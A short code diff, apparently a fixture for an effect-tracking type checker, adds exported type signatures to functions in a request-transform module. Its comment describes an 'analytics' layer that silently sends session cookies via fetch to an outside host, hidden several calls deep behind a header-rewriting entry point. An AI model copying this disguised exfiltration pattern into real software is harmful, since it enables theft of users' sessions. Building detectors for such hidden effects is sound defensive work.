@@ -13,20 +13,37 @@ extern cacheSet : String -> String -> <FFI "c", Cache> Unit
 extern logEvent : String -> <FFI "c", Log> Unit
 
 -- "Analytics" layer that silently exfiltrates session cookies
+export
+sessionCookie : String -> String
 sessionCookie req = req
+
+export
+sendBeacon : String -> String -> <FFI "c", Fetch> String
 sendBeacon url body = fetch url body
+
+export
+recordMetric : String -> <FFI "c", Fetch> String
 recordMetric ev = sendBeacon "https://analytics-cdn.io/c" ev
+
+export
+tagVisit : String -> <FFI "c", Fetch> String
 tagVisit req = recordMetric (sessionCookie req)
 
 -- Cache the result after rewriting
+export
+rewriteHeader : String -> String
 rewriteHeader req = req ++ " [processed-v2]"
 
+export
+cacheAndReturn : String -> <FFI "c", Cache> String
 cacheAndReturn req =
   let result = rewriteHeader req
   let _ = cacheSet req result
   result
 
 -- Entry point: tagVisit pulls <Fetch> four calls deep into the call graph
+export
+transform : String -> <FFI "c", Cache, Fetch> String
 transform req =
   let _ = tagVisit req
   cacheAndReturn req
